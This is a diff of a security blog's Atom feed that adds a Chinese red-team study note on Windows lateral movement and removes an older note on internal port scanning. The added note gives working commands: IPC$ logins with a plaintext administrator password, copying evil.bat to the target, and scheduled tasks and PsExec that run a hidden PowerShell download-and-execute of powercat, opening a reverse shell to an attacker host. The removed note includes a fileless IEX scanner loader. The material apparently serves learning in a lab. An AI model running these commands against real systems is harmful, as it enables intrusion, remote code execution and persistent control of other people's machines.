@@ -6,7 +6,7 @@
   <link href="https://www.teamssix.com/atom.xml" rel="self"/>
   
   <link href="https://www.teamssix.com/"/>
-  <updated>2021-07-30T08:03:16.118Z</updated>
+  <updated>2021-08-03T08:08:51.457Z</updated>
   <id>https://www.teamssix.com/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>【内网学习笔记】19、IPC 与计划任务</title>
+    <link href="https://www.teamssix.com/year/210802-181052.html"/>
+    <id>https://www.teamssix.com/year/210802-181052.html</id>
+    <published>2021-08-02T10:10:52.000Z</published>
+    <updated>2021-08-03T08:08:51.457Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>在多层代理的环境中，由于网络限制，通常采用命令行的方式连接主机，这里学习下 IPC 建立会话与配置计划任务的相关点。</p><h2 id="1、IPC"><a href="#1、IPC" class="headerlink" title="1、IPC"></a>1、IPC</h2><p>IPC (Internet Process Connection) 是为了实现进程间通信而开放的命名管道，当目标开启了 IPC$ 文件共享并得到用户账号密码后，就可以使用 IPC 建立连接，获取权限。</p><p>建立 IPC 连接：</p><pre><code>net use \\192.168.7.107\ipc$ &quot;1qaz@WSX&quot; /user:administrator</code></pre><p>输入 net use 可以查看当前建立的连接</p><pre><code>C:\&gt;net use \\192.168.7.107\ipc$ &quot;1qaz@WSX&quot; /user:administrator命令成功完成。C:\&gt;net use会记录新的网络连接。状态       本地        远程                      网络-------------------------------------------------------------------------------OK                     \\192.168.7.107\ipc$      Microsoft Windows Network命令成功完成。</code></pre><p>映射磁盘到本地</p><pre><code>net use t: \\192.168.7.107\c$</code></pre><p>如果想删除映射的磁盘</p><pre><code>net use t: /del</code></pre><p>dir 列出对方目录</p><pre><code>dir \\192.168.7.107\c$</code></pre><pre><code>C:\&gt;dir \\192.168.7.107\c$ 驱动器 \\192.168.7.107\c$ 中的卷没有标签。 卷的序列号是 BC2F-8F01 \\192.168.7.107\c$ 的目录2020/11/24  17:28    &lt;DIR&gt;          Program Files2020/11/24  17:26    &lt;DIR&gt;          Program Files (x86)2021/02/13  17:49    &lt;DIR&gt;          TEMP2021/08/02  11:42    &lt;DIR&gt;          Users2020/11/25  08:37    &lt;DIR&gt;          Windows               0 个文件              0 字节              5 个目录 32,833,009,664 可用字节</code></pre><p>tasklist 查看进程</p><pre><code>tasklist /S 192.168.7.107 /U administrator /P 1qaz@WSX</code></pre><pre><code>C:\&gt;tasklist /S 192.168.7.107 /U administrator /P 1qaz@WSX映像名称                       PID 会话名              会话#       内存使用========================= ======== ================ =========== ============System Idle Process              0                            0         24 KSystem                           4                            0        368 Ksmss.exe                       260                            0        628 Kcsrss.exe                      356                            0      2,360 Kwininit.exe                    408                            0        264 Kcsrss.exe                      420                            1      8,692 Kwinlogon.exe                   468                            1      2,012 Kservices.exe                   512                            0      7,460 Klsass.exe                      520                            0     10,216 Klsm.exe                        528                            0      4,148 Kspoolsv.exe                   1356                            0      6,504 Ksvchost.exe                   1392                            0      7,028 K</code></pre><p>使用 \del 可断开连接</p><pre><code>net use \\192.168.7.107\ipc$ /del</code></pre><h2 id="2、计划任务"><a href="#2、计划任务" class="headerlink" title="2、计划任务"></a>2、计划任务</h2><p>Windows 可用于创建计划任务的命令有两个，分别是 at 和 schtasks，at 在 Windows Server 2008 及之后的系统中，已经被废弃了。</p><p>这里看看在建立 IPC 连接后，使用计划任务运行可执行文件，主要步骤如下：</p><p>1、查看目标主机时间</p><p>2、上传可执行文件到目标主机</p><p>3、设置计划任务执行可执行文件</p><p>4、删除计划任务</p><p>首先查看下目标主机时间</p><pre><code>net time \\192.168.7.107</code></pre><pre><code>C:\&gt;net time \\192.168.7.107\\192.168.7.107 的当前时间是 2021/8/2 14:28:01命令成功完成。</code></pre><p>创建一个反弹木马 bat 程序，这里使用 PowerShell 进行反弹，bat 文件内容如下：</p><pre><code>powershell.exe -nop -w hidden -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://ghproxy.com/raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);powercat -c 192.168.7.4 -p 4444 -e cmd&quot;</code></pre><p>在攻击机上开启 nc 监听</p><pre><code>nc -lvp 4444</code></pre><p>将 bat 程序上传到目标主机</p><pre><code>copy evil.bat \\192.168.7.107\c$</code></pre><p>使用 at 创建计划任务</p><pre><code>at \\192.168.7.107 14:30 C:\evil.bat</code></pre><p>如果想清除 ID 为 1 的计划任务</p><pre><code>at \\192.168.7.107 1 /del</code></pre><p>使用 schtasks 创建计划任务</p><pre><code># 开机以 system 权限执行 C:\evil.batschtasks /create /s 192.168.7.107 /tn evil /sc onstart /tr C:\evil.bat /ru system /f# 在 2021/08/03 前的每一天的 14:30:00 执行 C:\evil.batschtasks /create /s 192.168.7.107 /tn evil /tr C:\evil.bat /sc daily /st 14:30:00 /ed 2021/08/03# 立刻运行名称为 evil 的任务schtasks /run /s 192.168.7.107 /i /tn &quot;evil&quot;</code></pre><p>如果想清除名称为 evil 的计划任务</p><pre><code>schtasks /delete /s 192.168.7.107 /tn &quot;evil&quot; /f</code></pre><p>在建立 IPC 连接后，除了使用计划任务进行间接的反弹 Shell，还可以通过 PsExec 直接反弹 Shell</p><p>PsExec 下载地址：<a href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p><pre><code>Psexec.exe -accepteula \\192.168.7.107 -s cmd.exe</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210802180916.png"></p><blockquote><p>参考文章：<br><a href="https://www.freebuf.com/articles/web/251389.html">https://www.freebuf.com/articles/web/251389.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;在多层代理的环境中，由于网络限制，通常采用命令行的方式连接主机，这里学习下 IPC 建立会话与配置计划任务的相关点。&lt;/p&gt;</summary>
+      
+    
+    
+    
+    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    
+    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
+    
+    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
+    
+  </entry>
   
   <entry>
     <title>【内网学习笔记】18、LLMNR 和 NetBIOS 欺骗攻击</title>
@@ -532,38 +560,6 @@
       
       
     <summary type="html">&lt;h2 id=&quot;1、介绍&quot;&gt;&lt;a href=&quot;#1、介绍&quot; class=&quot;headerlink&quot; title=&quot;1、介绍&quot;&gt;&lt;/a&gt;1、介绍&lt;/h2&gt;&lt;p&gt;在内网中，如果攻击者使用 HTTP、DNS 等应用层隧道都失败了，那么或许可以试试网络层的 ICMP 隧道，ICMP 协议最</summary>
-      
-    
-    
-    
-    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【内网学习笔记】域内主机端口探测的一些方法总结</title>
-    <link href="https://www.teamssix.com/year/210317-201858.html"/>
-    <id>https://www.teamssix.com/year/210317-201858.html</id>
-    <published>2021-03-17T12:18:58.000Z</published>
-    <updated>2021-07-28T05:17:57.038Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><p>注：本文中的工具均来源自互联网，后门自查。</p></blockquote><p>在进入目标域后，对域内存活主机进行端口探测是经常要做的一步，在此记录一些常见的方法。</p><h2 id="1、Telnet"><a href="#1、Telnet" class="headerlink" title="1、Telnet"></a>1、Telnet</h2><p>如果想探测某台主机的某个端口是否开放，直接使用 telnet 命令是最方便的。</p><pre><code>C:\Users\daniel10&gt;telnet dc 80正在连接dc...无法打开到主机的连接。 在端口 80: 连接失败C:\Users\daniel10&gt;telnet 192.168.7.7 443正在连接192.168.7.7...无法打开到主机的连接。 在端口 443: 连接失败</code></pre><h2 id="2、nc"><a href="#2、nc" class="headerlink" title="2、nc"></a>2、nc</h2><p>素有瑞士军刀之称的 nc 也是可以拿来做端口探测的。</p><p>nc 下载地址：<a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p><pre><code>nc.exe -vv 192.168.7.7 3389</code></pre><pre><code>C:\Users\daniel10&gt;nc.exe -vv 192.168.7.7 3389DNS fwd/rev mismatch: DC != DC.teamssix.comDC [192.168.7.7] 3389 (ms-wbt-server) open</code></pre><p>拿来进行多个端口扫描也是可以的，就是扫描速度有点慢</p><pre><code>nc.exe -rz -w 2 -vv 192.168.7.7 0-65535-r 随机指定本地与远端主机的通信端口-z 使用0输入/输出模式，只在扫描通信端口时使用-w&lt;超时秒数&gt; 设置等待连线的时间</code></pre><pre><code>C:\Users\daniel10&gt;nc.exe -rz -w 2 -vv 192.168.7.7 443-445DNS fwd/rev mismatch: DC != DC.teamssix.comDC [192.168.7.7] 444 (?): TIMEDOUTDC [192.168.7.7] 443 (https): TIMEDOUTDC [192.168.7.7] 445 (microsoft-ds) opensent 0, rcvd 0</code></pre><h2 id="3、fscan"><a href="#3、fscan" class="headerlink" title="3、fscan"></a>3、fscan</h2><p>影舞者大佬写的一款工具，使用起来感觉很是方便，项目地址：<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><pre><code>fscan.exe -h 192.168.7.7 -p 22,445</code></pre><pre><code>C:\Users\daniel10&gt;fscan.exe -h 192.168.7.7 -p 22,445   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;\____/     |___/\___|_|  \__,_|\___|_|\_\                     fscan version: 1.5.1scan start(icmp) Target &#39;192.168.7.7&#39; is aliveicmp alive hosts len is: 1192.168.7.7:445 open[+] 192.168.7.7 MS17-010        (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)scan end</code></pre><h2 id="4、ScanLine"><a href="#4、ScanLine" class="headerlink" title="4、ScanLine"></a>4、ScanLine</h2><p>McAfee 出品的一款经典的端口扫描工具，ScanLine 项目地址：<a href="www.mcafee.com/us/downloads/free-tools/termsofuse.aspx">www.mcafee.com/us/downloads/free-tools/termsofuse.aspx</a></p><p>但是项目地址的下载按钮貌似失效了，其他的下载地址：<a href="https://www.lanzous.com/i32zncf">https://www.lanzous.com/i32zncf</a></p><pre><code>scanline.exe -h -t 22,80,445,3389 -p 192.168.7.7</code></pre><pre><code>C:\Users\daniel10&gt;scanline.exe -h -t 22,80,445,3389 -p 192.168.7.7ScanLine (TM) 1.01Copyright (c) Foundstone, Inc. 2002http://www.foundstone.comScan of 1 IP started at Wed Feb 24 21:31:11 2021-------------------------------------------------------------------------------192.168.7.7Responds with ICMP unreachable: NoTCP ports: 445 3389-------------------------------------------------------------------------------Scan finished at Wed Feb 24 21:31:15 20211 IP and 4 ports scanned in 0 hours 0 mins 4.03 secs</code></pre><h2 id="5、S-扫描器"><a href="#5、S-扫描器" class="headerlink" title="5、S 扫描器"></a>5、S 扫描器</h2><p>S 扫描器支持大网段扫描，扫描速度也很快，是比较早期的一款扫描工具了，比较适合运行在 Windows Server 2003 以下版本的操作系统中，下载地址：<a href="https://pan.baidu.com/s/1gdGM4F5">https://pan.baidu.com/s/1gdGM4F5</a></p><blockquote><p>值得提一句的是在我下载该工具到本地后，火绒立马给它删了，而其他的扫描工具火绒都没告警。</p></blockquote><pre><code>s.exe tcp 192.168.7.7 22,80,443,445 7</code></pre><pre><code>C:\Users\daniel10&gt;s.exe tcp 192.168.7.7 22,80,443,445 7TCP Port Scanner V1.1 By WinEggDropNormal Scan: About To Scan 4 Ports Using 7 Thread192.168.7.7      445   OpenScan 192.168.7.7 Complete In 0 Hours 0 Minutes 3 Seconds. Found 1 Open Ports</code></pre><h2 id="6、PowerShell-脚本"><a href="#6、PowerShell-脚本" class="headerlink" title="6、PowerShell 脚本"></a>6、PowerShell 脚本</h2><h3 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h3><p>PowerSploit 的 Invoke-Portscan 脚本下载地址：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1</a></p><p>无文件形式（推荐）</p><pre><code>powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#39;);Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#39;445,1433,80,8080,3389&#39;&quot;</code></pre><blockquote><p>如果报错，估计是网络的问题</p></blockquote><p>有文件形式</p><pre><code>powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-Portscan.ps1;Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#39;445,1433,80,8080,3389&#39;&quot;</code></pre><pre><code>C:\Users\daniel10&gt;powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-Portscan.ps1;Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#39;445,1433,80,8080,3389&#39;&quot;Hostname      : 192.168.7.7alive         : TrueopenPorts     : &#123;445, 3389&#125;closedPorts   : &#123;8080, 80, 1433&#125;filteredPorts : &#123;&#125;finishTime    : 2021/2/24 下午 21:14:06</code></pre><h3 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h3><p>nishang 的 Invoke-Portscan 脚本下载地址：<a href="https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1">https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1</a></p><pre><code> Invoke-PortScan -StartAddress 192.168.7.7 -EndAddress 192.168.7.7 -ScanPort -Port 80,443,445</code></pre><pre><code>PS C:\Users\daniel10&gt; Import-Module .\Invoke-Portscan.ps1PS C:\Users\daniel10&gt; Invoke-PortScan -StartAddress 192.168.7.7 -EndAddress 192.168.7.7 -ScanPort -Port 80,443,445IPAddress   HostName Ports---------   -------- -----192.168.7.7          &#123;445&#125;</code></pre><h2 id="7、MSF"><a href="#7、MSF" class="headerlink" title="7、MSF"></a>7、MSF</h2><p>万能的 MSF 自然也是能够进行端口探测的，MSF 中用于端口探测的模块有：</p><pre><code>auxiliary/scanner/portscan/ack          TCP ACK端口扫描auxiliary/scanner/portscan/ftpbounce    FTP bounce端口扫描auxiliary/scanner/portscan/syn             SYN端口扫描auxiliary/scanner/portscan/tcp          TCP端口扫描  auxiliary/scanner/portscan/xmas         TCP XMas端口扫描……</code></pre><p>除了上述工具外，还有 nmap、masscan 什么的就不多说了，读者如果感兴趣可以自行尝试玩玩。</p><blockquote><p>参考文章：</p><p><a href="https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/">https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;blockquote&gt;
-&lt;p&gt;注：本文中的工具均来源自互联网，后门自查。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;在进入目标域后，对域内存活主机进行端口探测是经常要做的一步，在此记录一些常见的方法。&lt;/p&gt;
-&lt;h2 id=&quot;1、Telnet&quot;&gt;&lt;a href=&quot;#1、Teln</summary>
       
     
     
